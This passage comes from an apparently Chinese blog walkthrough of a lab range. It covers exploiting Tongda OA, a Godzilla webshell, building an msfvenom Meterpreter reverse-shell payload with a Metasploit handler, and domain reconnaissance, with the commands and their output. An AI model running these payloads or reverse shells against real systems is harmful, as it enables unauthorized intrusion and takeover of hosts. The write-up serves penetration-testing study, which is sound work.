上用浏览器访问192.168.52.30:8080【—&gt;proxychains—&gt; kali的127.0.0.1:1080–&gt;ew客户端监听socks隧道并转发–&gt;DMZ区web1的ew服务端的1234端口–&gt;】访问192.168.52.30:8080</p><p>最终的效果就是kali能够成功访问到内网的web服务。</p><h1 id="七、二层网络通达OA渗透获取主机权限"><a href="#七、二层网络通达OA渗透获取主机权限" class="headerlink" title="七、二层网络通达OA渗透获取主机权限"></a>七、二层网络通达OA渗透获取主机权限</h1><p>详细过程参考本站《通达OA漏洞探测及利用》一文。</p><h2 id="7-1-漏洞探测"><a href="#7-1-漏洞探测" class="headerlink" title="7.1 漏洞探测"></a>7.1 漏洞探测</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go scan <span class="token parameter variable">-u</span> http://192.168.52.30:8080/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2011.24.08.png" style="zoom:50%;"><h2 id="7-2-漏洞利用"><a href="#7-2-漏洞利用" class="headerlink" title="7.2  漏洞利用"></a>7.2  漏洞利用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go exp <span class="token parameter variable">-u</span> http://192.168.52.30:8080/ <span class="token parameter variable">-i</span> Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2010.28.33.png" style="zoom:50%;"><h2 id="7-4-getshell"><a href="#7-4-getshell" class="headerlink" title="7.4 getshell"></a>7.4 getshell</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2010.52.50.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2010.53.31.png" style="zoom:50%;"><p>成功getshell!</p><p>nt authority\system 权限！</p><h2 id="7-5-通过哥斯拉上线meterpreter"><a href="#7-5-通过哥斯拉上线meterpreter" class="headerlink" title="7.5 通过哥斯拉上线meterpreter"></a>7.5 通过哥斯拉上线meterpreter</h2><p>选择PMeterpreter模块，设置为攻击机的ip和监听端口。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.41.55.png" style="zoom:50%;"><p>攻击机设置msf</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use exploit/multi/handler msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0.0</span>.0.0msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">12345</span>lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">12345</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.34.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.52.png" style="zoom:50%;"><p>至此，DMZ区和二层网络的主机均被拿下，而且都是最高权限！✅</p><h1 id="八、内网信息收集"><a href="#八、内网信息收集" class="headerlink" title="八、内网信息收集"></a>八、内网信息收集</h1><h2 id="8-1-Godzilla收集"><a href="#8-1-Godzilla收集" class="headerlink" title="8.1 Godzilla收集"></a>8.1 Godzilla收集</h2><h3 id="8-1-1-基础信息"><a href="#8-1-1-基础信息" class="headerlink" title="8.1.1 基础信息"></a>8.1.1 基础信息</h3><p>基础信息：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.53.35.png" style="zoom:50%;"><h3 id="8-1-2-执行命令"><a href="#8-1-2-执行命令" class="headerlink" title="8.1.2 执行命令"></a>8.1.2 执行命令</h3><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.12.06.png" style="zoom:50%;"><p>内容不友好，可读性较差。</p><h2 id="8-2-php-meterpreter-信息收集"><a href="#8-2-php-meterpreter-信息收集" class="headerlink" title="8.2 php/meterpreter 信息收集"></a>8.2 php/meterpreter 信息收集</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.48.05.png" style="zoom:50%;"><p>php/meterpreter 能够执行的命令有限。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.50.34.png" style="zoom:60%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.58.44.png" style="zoom:50%;"><p>能进入C:/windows/system32</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.00.56.png" style="zoom:50%;"><p>php形式的meterpreter不太行，收集的信息不多。</p><h2 id="8-3-msfvenom制作并上传反弹shell的payload"><a href="#8-3-msfvenom制作并上传反弹shell的payload" class="headerlink" title="8.3 msfvenom制作并上传反弹shell的payload"></a>8.3 msfvenom制作并上传反弹shell的payload</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">172.20</span>.10.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">23456</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.15.17.png" style="zoom:30%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.18.04.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.18.26.png" style="zoom:50%;"><h2 id="8-4-上线windows-x64-meterpreter"><a href="#8-4-上线windows-x64-meterpreter" class="headerlink" title="8.4 上线windows/x64/meterpreter"></a>8.4 上线windows/x64/meterpreter</h2><p>msf设置监听：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">172.20</span>.10.4<span class="token builtin class-name">set</span> lport <span class="token number">23456</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.20.45.png" style="zoom:50%;"><p>靶机执行脚本后成功上线 windows/x64/meterpreter</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.23.01.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.23.49.png" style="zoom:50%;"><p>这个meterpreter能够执行的命令要相对多一些。</p><h2 id="8-5-内网信息收集"><a href="#8-5-内网信息收集" class="headerlink" title="8.5 内网信息收集"></a>8.5 内网信息收集</h2><h3 id="8-5-2-基本信息收集"><a href="#8-5-2-基本信息收集" class="headerlink" title="8.5.2 基本信息收集"></a>8.5.2 基本信息收集</h3><h4 id="1）sysinfo"><a href="#1）sysinfo" class="headerlink" title="1）sysinfo"></a>1）sysinfo</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> sysinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.42.16.png" style="zoom:50%;"><p>可以看到是一台win7，x64架构，所在的域WHOAMIANONY，登录的用户有3个。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> shellsysteminfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.43.56.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.44.55.png" style="zoom:50%;"><blockquote><h4 id="障碍扫除-meterpreter乱码问题："><a href="#障碍扫除-meterpreter乱码问题：" class="headerlink" title="障碍扫除-meterpreter乱码问题："></a>障碍扫除-meterpreter乱码问题：</h4><p>进入shell之后，执行<code>chcp 65001</code></p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.48.00.png" style="zoom:40%;"><p>chcp 是一个在 Windows 命令提示符（cmd）中使用的命令，用于更改或显示当前使用的代码页。代码页定义了字符在计算机中如何表示，包括字符的编码和解码方式。</p><p>65001 是 UTF-8 编码的代码页编号。UTF-8 是一种广泛使用的字符编码，它可以表示任何 Unicode 字符，并与 ASCII 编码兼容。在命令提示符中运行 chcp 65001 命令会将当前会话的代码页更改为 UTF-8。这通常用于确保命令行可以正确处理和显示 Unicode 字符，例如中文、日文、韩文等非拉丁字符。</p></blockquote><h4 id="2）systeminfo"><a href="#2）systeminfo" class="headerlink" title="2）systeminfo"></a>2）systeminfo</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>systeminfosysteminfoHost Name:                 PC1OS Name:                   Microsoft Windows <span class="token number">7</span> 专业版 OS Version:                <span class="token number">6.1</span>.7601 Service Pack <span class="token number">1</span> Build <span class="token number">7601</span>OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          Windows 用户Registered Organization:   Product ID:                00371-177-0000061-85693Original Install Date:     <span class="token number">2019</span>/8/25, <span class="token number">9</span>:54:10System Boot Time:          <span class="token number">2024</span>/12/31, <span class="token number">17</span>:43:46System Manufacturer:       VMware, Inc.System Model:              VMware Virtual PlatformSystem Type:               x64-based PCProcessor<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:              <span class="token number">1</span> Processor<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Installed.                           <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: Intel64 Family <span class="token number">6</span> Model <span class="token number">158</span> Stepping <span class="token number">10</span> GenuineIntel ~2592 MhzBIOS Version:              Phoenix Technologies LTD <span class="token number">6.00</span>, <span class="token number">2020</span>/7/22Windows Directory:         C:<span class="token punctuation">\</span>WindowsSystem Directory:          C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32Boot Device:               <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1System Locale:             zh-cn<span class="token punctuation">;</span>Chinese <span class="token punctuation">(</span>China<span class="token punctuation">)</span>Input Locale:              zh-cn<span class="token punctuation">;</span>Chinese <span class="token punctuation">(</span>China<span class="token punctuation">)</span>Time Zone:                 <span class="token punctuation">(</span>UTC+08:00<span class="token punctuation">)</span> Beijing, Chongqing, Hong Kong, UrumqiTotal Physical Memory:     <span class="token number">2,047</span> MBAvailable Physical Memory: <span class="token number">306</span> MBVirtual Memory: Max Size:  <span class="token number">4,095</span> MBVirtual Memory: Available: <span class="token number">1,565</span> MBVirtual Memory: In Use:    <span class="token number">2,530</span> MBPage File Location<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:     C:<span class="token punctuation">\</span>pagefile.sysDomain:                    whoamianony.orgLogon Server:              N/AHotfix<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:                 <span class="token number">4</span> Hotfix<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Installed.                           <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: KB2534111                           <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: KB2999226                           <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: KB958488                           <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: KB976902Network Card<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:           <span class="token number">4</span> NIC<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Installed.                           <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection                                 Connection Name: 本地连接                                 DHCP Enabled:    No                                 IP address<span class="token punctuation">(</span>es<span class="token punctuation">)</span>                                 <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: <span class="token number">192.168</span>.52.30                                 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: fe80::481d:3bc4:e671:f945                                 <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: fd15:4ba5:5a2b:1008:d5a6:4c1e:3d3b:8db0                                 <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: fd15:4ba5:5a2b:1008:481d:3bc4:e671:f945                           <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: Bluetooth 设备<span class="token punctuation">(</span>个人区域网<span class="token punctuation">)</span>                                 Connection Name: Bluetooth 网络连接                                 Status:          Media disconnected                           <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: Microsoft Loopback Adapter                                 Connection Name: Npcap Loopback Adapter                                 DHCP Enabled:    Yes                                 DHCP Server:     <span class="token number">255.255</span>.255.255                                 IP address<span class="token punctuation">(</span>es<span class="token punctuation">)</span>                                 <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: <span class="token number">169.254</span>.129.186                                 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: fe80::b461:ccad:e30f:81ba                           <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection                                 Connection Name: 本地连接 <span class="token number">4</span>                                 DHCP Enabled:    No                                 IP address<span class="token punctuation">(</span>es<span class="token punctuation">)</span>                                 <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: <span class="token number">192.168</span>.93.20                                 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: fe80::4470:563b:f7c2:3f8a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有几条需要特别关注的信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">域： whoamianony.org补丁： <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: KB2534111 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: KB2999226  <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: KB958488 <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: KB976902IP：192.168.52.30 、192.168.93.20      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从之前的DMZ和二层网络渗透的过程来看，192.168.52.0/24这个网段是二层网络的网段，92.168.93.0/24这个网段因该就是三层网络的网段了。ipconfig执行结果也类似：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.57.45.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.58.24.png" style="zoom:50%;"><h4 id="3）ipconfig-all"><a href="#3）ipconfig-all" class="headerlink" title="3）ipconfig /all"></a>3）ipconfig /all</h4><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.00.11.png" style="zoom:40%;"><p>可以看出域环境为whoamianony.org</p><h4 id="4）route-print-路由信息"><a href="#4）route-print-路由信息" class="headerlink" title="4）route print 路由信息"></a>4）route print 路由信息</h4><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.04.55.png" style="zoom:30%;"><h4 id="5）net-start查看开启了哪些服务"><a href="#5）net-start查看开启了哪些服务" class="headerlink" title="5）net start查看开启了哪些服务"></a>5）net start查看开启了哪些服务</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net startnet startThese Windows services are started:   Application Experience   Application Information   Base Filtering Engine   Bluetooth Support Service   COM+ Event System   Computer Browser   Cryptographic Services   DCOM Server Process Launcher   Desktop Window Manager Session Manager   DHCP Client   Diagnostic Policy Service   Diagnostic Service Host   Diagnostic System Host   Distributed Link Tracking Client   Distributed Transaction Coordinator   DNS Client   Group Policy Client   IKE and AuthIP IPsec Keying Modules   IP Helper   IPsec Policy Agent   MySQL5_OA   Netlogon   Network Connections   Network List Service   Network Location Awareness   Network Store Interface Service   Office_Daemon   Office_DbProxy   Office_IM   Office_Index   Office_Mail   Office_MQ   Office_POP3   Office_Redis   Office_Task   Office_Web   Offline Files   Plug and Play   Power   Print Spooler   Program Compatibility Assistant Service   Remote Procedure Call <span class="token punctuation">(</span>RPC<span class="token punctuation">)</span>   RPC Endpoint Mapper   Security Accounts Manager   Security Center   Server   Shell Hardware Detection   Software Protection   SPP Notification Service   System Event Notification Service   Task Scheduler   TCP/IP NetBIOS Helper   Themes   TP AutoConnect Service   User Profile Service   VMware Alias Manager and Ticket Service   VMware Tools   VMware ��������������   Windows Audio   Windows Audio Endpoint Builder   Windows Defender   Windows Event Log   Windows Firewall   Windows Font Cache Service   Windows Management Instrumentation   Windows Search   Windows Time   Windows Update   WorkstationThe <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6）net-share-查看开启了哪些共享"><a href="#6）net-share-查看开启了哪些共享" class="headerlink" title="6）net share 查看开启了哪些共享"></a>6）net share 查看开启了哪些共享</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net sharenet shareShare name   Resource                        Remark-------------------------------------------------------------------------------C$           C:<span class="token punctuation">\</span>                             Ĭ�Ϲ���                              IPC$                                         Զ�� IPC                            ADMIN$       C:<span class="token punctuation">\</span>Windows                      Զ����                              The <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 Windows 系统中，<code>net share</code> 命令用于显示或管理网络共享资源。从您提供的命令输出来看，列出了几个默认的 Windows 共享：</p><ol><li><strong>C$</strong> - 这是 C 盘的默认共享，允许管理员在网络上访问 C 盘根目录。在命令输出中显示为乱码，这可能是由于命令行界面的字符编码设置不正确导致的。</li><li><strong>IPC$</strong> - 这是 Windows 的命名管道共享，用于进程间通信（IPC）。它不对应于文件系统中的实际路径，而是用于远程管理服务。</li><li><strong>ADMIN$</strong> - 这是 Windows 系统中的默认管理共享，通常指向 Windows 目录（C:\Windows），用于远程管理。</li></ol></blockquote><h4 id="7）net-user-查看本机用户"><a href="#7）net-user-查看本机用户" class="headerlink" title="7）net user 查看本机用户"></a>7）net user 查看本机用户</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net usernet userUser accounts <span class="token keyword">for</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-------------------------------------------------------------------------------Administrator            Guest                    The <span class="token builtin class-name">command</span> completed with one or <span class="token function">more</span> errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到Administrator 和 Guest 用户。</p><h3 id="8-5-3-域内信息收集"><a href="#8-5-3-域内信息收集" class="headerlink" title="8.5.3 域内信息收集"></a>8.5.3 域内信息收集</h3><h4 id="1）域内其他主机名"><a href="#1）域内其他主机名" class="headerlink" title="1）域内其他主机名"></a>1）域内其他主机名</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net view<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.07.26.png" style="zoom:40%;"><p>可以看到域内还有一台域控。</p><h4 id="2）查看arp缓存"><a href="#2）查看arp缓存" class="headerlink" title="2）查看arp缓存"></a>2）查看arp缓存</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>arp <span class="token parameter variable">-a</span>arp <span class="token parameter variable">-a</span>Interface: <span class="token number">192.168</span>.52.30 --- 0xb  Internet Address      Physical Address      Type  <span class="token number">192.168</span>.52.1          fa-ff-c2-c2-93-66     dynamic     <span class="token number">192.168</span>.52.10         00-0c-29-b3-0c-c2     dynamic     <span class="token number">192.168</span>.52.20         00-0c-29-cd-28-24     dynamic     <span class="token number">192.168</span>.52.255        ff-ff-ff-ff-ff-ff     static      <span class="token number">224.0</span>.0.22            01-00-5e-00-00-16     static      <span class="token number">224.0</span>.0.252           01-00-5e-00-00-fc     static    Interface: <span class="token number">169.254</span>.129.186 --- 0x16  Internet Address      Physical Address      Type  <span class="token number">169.254</span>.255.255       ff-ff-ff-ff-ff-ff     static      <span class="token number">224.0</span>.0.22            01-00-5e-00-00-16     static      <span class="token number">224.0</span>.0.252           01-00-5e-00-00-fc     static      <span class="token number">255.255</span>.255.255       ff-ff-ff-ff-ff-ff     static    Interface: <span class="token number">192.168</span>.93.20 --- 0x17  Internet Address      Physical Address      Type  <span class="token number">192.168</span>.93.1          fa-ff-c2-c2-93-65     dynamic     <span class="token number">192.168</span>.93.10         00-0c-29-cd-28-2e     dynamic     <span class="token number">192.168</span>.93.30         00-0c-29-9f-f6-36     dynamic     <span class="token number">192.168</span>.93.40         00-0c-29-aa-22-ae     dynamic     <span class="token number">192.168</span>.93.255        ff-ff-ff-ff-ff-ff     static      <span class="token number">224.0</span>.0.22            01-00-5e-00-00-16     static      <span class="token number">224.0</span>.0.252           01-00-5e-00-00-fc     static    c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到除了本机93.20外还有93.30和93.40的主机，可能两者之中的某一个就是域控，也就是我们的终极目标。</p><h4 id="3）net-config-workstation"><a href="#3）net-config-workstation" class="headerlink" title="3）net config workstation"></a>3）net config workstation</h4><p>查看计算机名、全名、用户名、系统版本、工作站、域、登录域</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.20.53.png" style="zoom:50%;"><p>没有查询到可用信息。</p><h4 id="4）net-user-domain-查看域用户"><a href="#4）net-user-domain-查看域用户" class="headerlink" title="4）net user /domain 查看域用户"></a>4）net user /domain 查看域用户</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net user /domainnet user /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问被拒绝了。</p><h4 id="5）net-localgroup-administrators-查看本地管理员组（通常会有域用户）"><a href="#5）net-localgroup-administrators-查看本地管理员组（通常会有域用户）" class="headerlink" title="5）net localgroup administrators   查看本地管理员组（通常会有域用户）"></a>5）net localgroup administrators   查看本地管理员组（通常会有域用户）</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net localgroup administratorsnet localgroup administratorsAlias name     administratorsComment        ����Ա�Լ�����/���в������Ƶ���ȫ����ȨMembers-------------------------------------------------------------------------------AdministratorThe <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Administrator大概率就是域管理员用户了。</p><h4 id="6）net-view-domain-查看有几个域"><a href="#6）net-view-domain-查看有几个域" class="headerlink" title="6）net view /domain   查看有几个域"></a>6）net view /domain   查看有几个域</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net view /domainnet view /domainDomain-------------------------------------------------------------------------------WHOAMIANONY          The <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个域。</p><h4 id="7）net-user-用户名-domain-获取指定域用户的信息"><a href="#7）net-user-用户名-domain-获取指定域用户的信息" class="headerlink" title="7）net user 用户名 /domain   